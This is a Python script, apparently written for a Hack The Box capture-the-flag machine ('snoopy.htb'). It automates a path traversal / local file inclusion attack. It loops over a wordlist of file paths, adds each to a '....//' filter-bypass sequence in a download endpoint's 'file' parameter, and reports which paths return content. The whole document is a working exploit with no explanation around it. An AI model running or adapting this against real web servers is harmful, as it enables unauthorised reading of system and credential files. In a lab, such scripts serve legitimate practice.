import os
import requests
import random

def download_file(url, filename):
    with requests.get(url, stream=True) as response:
        response.raise_for_status()
        with open(filename, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)

def main():
    wordlist_filename = "lfi_wordlist_3"  
    
    if not os.path.exists(wordlist_filename):
        print(f"File '{wordlist_filename}' non trovato.")
        return
    
    with open(wordlist_filename, "r") as wordlist_file:
        wordlist = wordlist_file.read().splitlines()

    for word in wordlist:
        download_url = f"http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//....{word}"
        random_number = random.randint(1, 1000)
        zip_filename = f"{random_number}.zip" 
        
        # print(f"Download {zip_filename} URL: {download_url}...")
        download_file(download_url, zip_filename)
        
        file_size = os.path.getsize(zip_filename)
        if file_size > 0:
            print(word)
        
        
        os.remove(zip_filename)

if __name__ == "__main__":
    main()
